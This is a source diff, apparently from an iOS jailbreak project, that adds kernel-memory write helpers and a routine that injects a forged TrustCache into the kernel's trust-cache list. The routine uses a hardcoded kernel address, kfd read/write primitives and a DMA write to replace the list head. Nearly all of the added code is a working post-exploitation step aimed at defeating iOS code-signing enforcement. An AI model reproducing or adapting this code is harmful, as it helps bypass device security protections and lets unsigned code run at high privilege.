@@ -560,8 +560,65 @@ UInt64 getLoadAddr(mach_port_t port) {
     }
     return first_addr;
 }
+size_t kwritebuf_tcinject(uint64_t where, const void *p, size_t size) {
+    size_t remainder = size % 8;
+    if (remainder == 0)
+        remainder = 8;
+    size_t tmpSz = size + (8 - remainder);
+    if (size == 0)
+        tmpSz = 0;
+
+    uint64_t *dstBuf = (uint64_t *)p;
+    size_t alignedSize = (size & ~0b111);
+
+    for (int i = 0; i < alignedSize; i+=8){
+        kwrite64_kfd(where + i, dstBuf[i/8]);
+    }
+    if (size > alignedSize) {
+        uint64_t val = kread64_kfd(where + alignedSize);
+        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
+        kwrite64_kfd(where + alignedSize, val);
+    }
+    return size;
+}
+void tcinjecttest(void) {
+    UInt64 pmap_image4_trust_cachesstaticdkifworks = 0xFFFFFFF0078718C0;
+    UInt64 mem = kalloc(0x1000);
+    if(mem == 0) {
+        NSLog(@"Failed to allocate kernel memory for TrustCache: %p",mem);
+        exit(EXIT_FAILURE); // ensure no kpanics
+    }
+    UInt64 next = mem;
+    UInt64 us = mem + 0x8;
+    UInt64 tc = mem + 0x10;
+    NSLog(@"writing in us: %p",us);
+    kwrite64_kfd(us,mem + 0x10);
+    NSLog(@"Writing in tc: %p",tc);
+    kwrite32_kfd(tc, 0x1); // version
+    NSLog(@"Wrote version.");
+    kwritebuf_tcinject(tc + 0x4, @"blackbathingsuit", @"blackbathingsuit".length + 1); // don't ask
+    NSLog(@"Wrote blackbathingsuit.");
+    kwrite32_kfd(tc + 0x14, 22 * 100); // full page of entries
+    NSLog(@"Wrote full page of entries");
+    UInt64 pitc = pmap_image4_trust_cachesstaticdkifworks + get_kernel_slide();
+    NSLog(@"If stuff goes wrong, it's going wrong here!");
+    UInt64 cur = kread64_ptr_kfd(pitc);
+    NSLog(@"Cur: %p",cur);
+    if(cur == 0) {
+        NSLog(@"Failed to read TrustCache head!");
+        exit(EXIT_FAILURE); // ensure no kpanics
+    }
+    kwrite64_kfd(next, cur);
+    NSLog(@"wrote in cur %p",cur);
+    dma_perform(^{
+       //Replace head
+        dma_writevirt64(pitc, mem);
+    });
+    NSLog(@"TrustCache Successfully loaded!");
+}
 UInt64 load_telescope(void)
 {
+    /*
     NSString * err = NSString.new;
     NSString * out = NSString.new;
 
@@ -654,7 +711,6 @@ UInt64 load_telescope(void)
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        pthread_create(&th_exception, &attr, amfid_exception_thread, NULL);
-    /*
     uint64_t orig_nc_vp, orig_to_vnode = 0;
     SwitchSysBinOld(GetVnodeAtPathByChdir("/sbin"), "launchd", originallaunchd);
     //SwitchSysBin("/sbin/launchd", originallaunchd, &orig_to_vnode, &orig_nc_vp);
